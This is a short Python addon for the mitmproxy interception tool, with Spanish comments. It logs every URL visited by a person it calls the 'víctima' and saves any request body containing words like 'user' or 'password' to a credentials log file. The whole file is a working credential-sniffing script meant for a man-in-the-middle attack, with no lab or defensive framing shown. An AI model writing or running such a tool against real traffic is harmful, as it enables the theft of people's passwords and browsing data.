import logging
from mitmproxy import http
from urllib.parse import urlparse

# Configuración del logging
logging.basicConfig(filename="credenciales.log", level=logging.INFO, 
                    format="%(asctime)s - %(levelname)s - %(message)s")

def has_keywords(data, keywords):
    # Buscar palabras clave dentro de palabras más largas y sin distinguir mayúsculas y minúsculas
    return any(keyword.lower() in data.lower() for keyword in keywords)

def request(packet):
    try:
        url = packet.request.url
        parsed_url = urlparse(url)
        scheme = parsed_url.scheme
        domain = parsed_url.netloc
        path = parsed_url.path

        logging.info(f"URL visitada por la víctima: {scheme}://{domain}{path}")

        keywords = ["user", "pass", "username", "password"]  # Ampliar la lista de palabras clave
        data = packet.request.get_text()

        if has_keywords(data, keywords):
            logging.warning(f"Posibles credenciales capturadas en la URL: {scheme}://{domain}{path}")
            logging.warning(f"Datos: \n\n{data}\n")

    except Exception as e:
        logging.exception(f"Error al procesar la solicitud: {e}")